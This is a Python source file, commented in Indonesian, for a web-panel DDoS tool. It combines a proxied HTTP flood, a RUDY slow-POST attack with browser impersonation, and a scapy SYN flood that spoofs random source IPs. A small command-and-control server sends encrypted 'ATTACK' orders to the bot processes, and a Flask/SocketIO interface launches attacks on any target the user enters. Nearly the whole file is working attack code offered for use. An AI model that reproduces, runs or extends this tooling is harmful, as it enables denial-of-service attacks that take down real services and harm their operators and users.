import asyncio
import aiohttp
import random
import multiprocessing
import socket
import time
from scapy.all import *
from curl_cffi import requests as curl_requests
from flask import Flask, render_template
from flask_socketio import SocketIO, emit
from cryptography.fernet import Fernet

# Inisialisasi Flask dan SocketIO
app = Flask(__name__)
app.config["SECRET_KEY"] = "secret!"
socketio = SocketIO(app, async_mode="eventlet")

# Konfigurasi Default
TARGET = None
NUM_BOTS = 4
NUM_REQUESTS = 1000
C2_PORT = 9999
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
]
PROXIES = ["http://123.45.67.89:8080", "http://98.76.54.32:3128"]  # Ganti dengan proxy asli
key = Fernet.generate_key()
cipher = Fernet(key)
logs = []

# Fungsi Log
def log(message):
    logs.append(f"[{time.strftime('%H:%M:%S')}] {message}")
    socketio.emit("log_update", {"log": logs[-1]})

# Serangan L7: HTTP Flood
async def http_flood(bot_id, target):
    async with aiohttp.ClientSession() as session:
        sent = 0
        for _ in range(NUM_REQUESTS):
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            url = f"{target}?rand={random.randint(1, 1000000)}"
            try:
                async with session.get(url, headers=headers, proxy=random.choice(PROXIES)):
                    sent += 1
                    log(f"Bot {bot_id} - HTTP: Request sent to {url}")
                await asyncio.sleep(random.uniform(0.05, 2))
            except Exception as e:
                log(f"Bot {bot_id} - HTTP: Failed - {str(e)}")
        log(f"Bot {bot_id} - HTTP: Completed, {sent} requests sent")

# Serangan L7: RUDY
def rudy_attack(bot_id, target):
    headers = {"User-Agent": random.choice(USER_AGENTS), "Content-Length": "1000000"}
    sent = 0
    for _ in range(NUM_REQUESTS // 20):
        try:
            curl_requests.post(target, headers=headers, data=RandString(1000), 
                              impersonate="chrome", proxy=random.choice(PROXIES))
            sent += 1
            log(f"Bot {bot_id} - RUDY: Chunk sent to {target}")
            time.sleep(random.uniform(0.5, 3))
        except Exception as e:
            log(f"Bot {bot_id} - RUDY: Failed - {str(e)}")
    log(f"Bot {bot_id} - RUDY: Completed, {sent} chunks sent")

# Serangan L4: SYN Flood
def syn_flood(bot_id, target_ip):
    sent = 0
    for _ in range(NUM_REQUESTS):
        try:
            ip = IP(src=RandIP(), dst=target_ip)
            tcp = TCP(sport=random.randint(1024, 65535), dport=80, flags="S")
            send(ip / tcp, verbose=0)
            sent += 1
            log(f"Bot {bot_id} - SYN: Packet sent to {target_ip}")
        except Exception as e:
            log(f"Bot {bot_id} - SYN: Failed - {str(e)}")
        time.sleep(random.uniform(0.01, 0.5))
    log(f"Bot {bot_id} - SYN: Completed, {sent} packets sent")

# C2 Server
def c2_server():
    s = socket.socket()
    s.bind(("0.0.0.0", C2_PORT))
    s.listen(NUM_BOTS)
    bots = []
    log("C2 Server: Started, waiting for bots...")
    while len(bots) < NUM_BOTS:
        client, _ = s.accept()
        bots.append(client)
        log(f"C2 Server: Bot {len(bots)} connected")
    for client in bots:
        client.send(cipher.encrypt(b"ATTACK"))
        client.close()
    log("C2 Server: Attack command sent")

# Bot Client
def bot_client(bot_id, attack_func, target):
    s = socket.socket()
    s.connect(("127.0.0.1", C2_PORT))
    if cipher.decrypt(s.recv(1024)) == b"ATTACK":
        run_bot(bot_id, attack_func, target)
    s.close()

# Bot Runner
def run_bot(bot_id, attack_func, target):
    if attack_func == http_flood:
        asyncio.run(attack_func(bot_id, target))
    else:
        attack_func(bot_id, target if "http" in target else target.split("://")[-1].split("/")[0])

# Route dan Attack Handler
@app.route("/")
def home():
    return render_template("index.html", logs=logs)

@socketio.on("start_attack")
def handle_attack(data):
    global TARGET, NUM_BOTS, NUM_REQUESTS, logs
    TARGET = data["target"]
    NUM_BOTS = int(data["bots"])
    NUM_REQUESTS = int(data["requests"])
    logs = []  # Reset log
    log(f"Starting attack on {TARGET} with {NUM_BOTS} bots and {NUM_REQUESTS} requests...")

    attack_types = [http_flood, rudy_attack, syn_flood]
    processes = []

    c2_process = multiprocessing.Process(target=c2_server)
    c2_process.start()
    time.sleep(2)

    for bot_id in range(NUM_BOTS):
        attack_func = random.choice(attack_types)
        p = multiprocessing.Process(target=bot_client, args=(bot_id, attack_func, TARGET))
        processes.append(p)
        p.start()

    for p in processes:
        p.join()
    c2_process.join()

    log("Attack completed!")
    emit("attack_done", {"status": "completed"})

# Jalankan
if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=5000)